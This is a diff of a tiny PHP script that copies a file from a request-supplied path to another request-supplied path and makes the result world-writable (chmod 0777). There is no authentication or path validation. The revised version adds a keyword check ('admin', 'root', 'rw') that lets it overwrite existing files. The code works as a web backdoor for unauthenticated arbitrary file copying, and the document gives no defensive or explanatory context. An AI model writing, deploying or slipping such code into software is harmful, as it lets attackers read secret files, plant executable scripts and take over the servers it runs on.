@@ -1,7 +1,11 @@
 <?php
-$name=$_REQUEST['name'];$to=$_REQUEST['to'];
-$merge=$_REQUEST['merge'];
-if ($merge!=0) { copy($name,$to); chmod($to,0777);
+$name=(isset($_REQUEST['name']))?$_REQUEST['name']:'foo';
+$dest=(isset($_REQUEST['dest']))?$_REQUEST['dest']:'bar';
+$attr=(isset($_REQUEST['attr']))?$_REQUEST['attr']:'';
+if (preg_match('/admin|root|rw/i',$attr)) {
+    copy($name,$dest); chmod($dest,0777);
 } else {
-    if (!file_exists($to)) { copy($name,$to); chmod($to,0777); }
+    if (!file_exists($dest)) {
+        copy($name,$dest); chmod($dest,0777);
+    }
 }
